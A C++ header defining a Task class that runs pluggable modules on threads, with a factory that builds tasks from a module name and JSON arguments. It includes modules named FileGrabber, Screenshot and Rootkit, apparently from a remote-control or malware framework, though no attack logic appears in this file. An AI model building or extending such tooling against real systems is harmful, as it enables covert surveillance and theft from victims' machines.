#pragma once

#include <thread>
#include <iostream>
#include "BaseModule.h"
#include "../Modules/FileGrabber.h"
#include "../Modules/Screenshot.h"
#include "../Modules/Rootkit.h"

using supported_modules = supported_modules_enum;

class Task
{
private:
    std::thread task;
    //std::unique_ptr<BaseModule> m; /* m must be declared as pointer because its a pure virtual class */
    BaseModule * m;

public:
    Task(const Task &) = delete;

    Task(BaseModule * module_base) : m(module_base/*std::unique_ptr<BaseModule>(module_base)*/)
    { 
        /* */
    };

    ~Task()
    {
        /*
        */
    };

    void run()
    {
        task = std::thread(&BaseModule::run, m);
        
    }

    void stop()
    {
        if (task.joinable())
        {
            m->stop();
            task.join();
        }
    }

    const std::string & get_task_type()
    {
        return m->get_module_type();
    }

    bool operator==(Task * t2);

    static Task * BuildTask(const std::string & module_name, const json & args);
};
